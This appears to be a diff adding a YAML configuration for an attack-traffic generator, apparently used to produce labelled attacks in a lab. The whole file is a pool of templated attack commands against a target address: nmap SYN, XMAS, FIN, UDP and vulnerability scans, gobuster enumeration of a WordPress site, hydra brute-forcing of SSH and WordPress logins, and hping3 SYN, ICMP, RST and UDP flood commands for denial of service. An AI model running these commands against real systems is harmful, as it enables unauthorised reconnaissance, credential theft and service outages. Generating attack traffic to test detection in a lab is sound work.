@@ -1,0 +1,93 @@
+---
+
+ATTACKS_POOL:
+  scan_tcp_syn:
+    attacks:
+      - nmap -p $T_PORTS -sS -T1 $T_ADDR
+      - nmap -p $T_PORTS -sS -T2 $T_ADDR
+      - nmap -p $T_PORTS -sS -T3 $T_ADDR
+      - nmap -p $T_PORTS -sS -T4 $T_ADDR
+
+  scan_tcp_xmas:
+    attacks:
+      - nmap -p $T_PORTS -sX -T1 $T_ADDR
+      - nmap -p $T_PORTS -sX -T2 $T_ADDR
+      - nmap -p $T_PORTS -sX -T3 $T_ADDR
+      - nmap -p $T_PORTS -sX -T4 $T_ADDR
+
+  scan_tcp_fin:
+    attacks:
+      - nmap -p $T_PORTS -sF -T1 $T_ADDR
+      - nmap -p $T_PORTS -sF -T2 $T_ADDR
+      - nmap -p $T_PORTS -sF -T3 $T_ADDR
+      - nmap -p $T_PORTS -sF -T4 $T_ADDR
+
+  scan_udp:
+    attacks:
+      - nmap -p $T_PORTS -sU -T1 $T_ADDR
+      - nmap -p $T_PORTS -sU -T2 $T_ADDR
+      - nmap -p $T_PORTS -sU -T3 $T_ADDR
+      - nmap -p $T_PORTS -sU -T4 $T_ADDR
+
+
+  # scan with version scanning, fragmentation and default scanning scripts
+  scan_tcp_syn_advanced_scans:
+    attacks:
+      - nmap -p $T_PORTS -sS -sV --script=default -f -T1 $T_ADDR
+      - nmap -p $T_PORTS -sS -sV --script=default -f -T2 $T_ADDR
+      - nmap -p $T_PORTS -sS -sV --script=default -f -T3 $T_ADDR
+      - nmap -p $T_PORTS -sS -sV --script=default -f -T4 $T_ADDR
+
+  scan_tcp_xmas_advanced_scans:
+    attacks:
+      - nmap -p $T_PORTS -sX -sV --script=default -f -T1 $T_ADDR
+      - nmap -p $T_PORTS -sX -sV --script=default -f -T2 $T_ADDR
+      - nmap -p $T_PORTS -sX -sV --script=default -f -T3 $T_ADDR
+      - nmap -p $T_PORTS -sX -sV --script=default -f -T4 $T_ADDR
+
+  scan_tcp_fin_advanced_scans:
+    attacks:
+      - nmap -p $T_PORTS -sF -sV --script=default -f -T1 $T_ADDR
+      - nmap -p $T_PORTS -sF -sV --script=default -f -T2 $T_ADDR
+      - nmap -p $T_PORTS -sF -sV --script=default -f -T3 $T_ADDR
+      - nmap -p $T_PORTS -sF -sV --script=default -f -T4 $T_ADDR
+  
+  scan_vuln:
+    attacks:
+      -  nmap -sV -A --script vuln -p $T_PORTS -T3 $T_ADDR
+      
+  enumeration_dir_http:
+    attacks:
+      - gobuster dir --no-tls-validation -u https://$T_ADDR/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 1 
+      - gobuster dir --no-tls-validation -u https://$T_ADDR/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 2 
+      - gobuster dir --no-tls-validation -u https://$T_ADDR/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 3 
+      - gobuster dir --no-tls-validation -u https://$T_ADDR/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 4 
+
+  tcp_sequence_prediction:
+    attacks:
+      - hping3 -S -p $T_PORTS -Q $T_ADDR
+  
+  bruteforce_ssh_login: 
+    attacks:
+      - "hydra -vV -L /var/usernames.txt -P /var/passwords.txt $T_ADDR ssh -t 4"
+
+  bruteforce_wordpress_login: 
+    attacks:
+      - "hydra -vV -L /var/usernames.txt -P /var/passwords.txt $T_ADDR -V https-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 4"
+
+  dos_syn_flood:
+    attacks:
+      # DO NOT USE --flood param!!! Dangerous
+      # synflood 10 pkts per sec (-i u100000)
+      - /usr/sbin/hping3 -d 256 -S -w 64 -p $T_PORTS -i u100000 $T_ADDR
+  
+  ddos_attack:
+    playbook: ddos_attack.yaml
+
+  ddos_types:
+    syn_flood:         "/usr/sbin/hping3 -d $RAND -S -w 64             -i u1000 -E /dev/urandom -p $T_PORTS $T_ADDR"
+    icmp_flood:        "/usr/sbin/hping3 -d $RAND -1                   -i u500  -E /dev/urandom             $T_ADDR"
+    syn_ack_fin_flood: "/usr/sbin/hping3 -d $RAND -F -S -A             -i u500  -E /dev/urandom -p $T_PORTS $T_ADDR"
+    rst_flood:         "/usr/sbin/hping3 -d $RAND -R                   -i u500  -E /dev/urandom -p $T_PORTS $T_ADDR"
+    no_l4_flood:       "/usr/sbin/hping3 -d $RAND --rawip              -i u500                              $T_ADDR"
+    udp_flood:         "/usr/sbin/hping3 -d $RAND -2                   -i u500                              $T_ADDR"
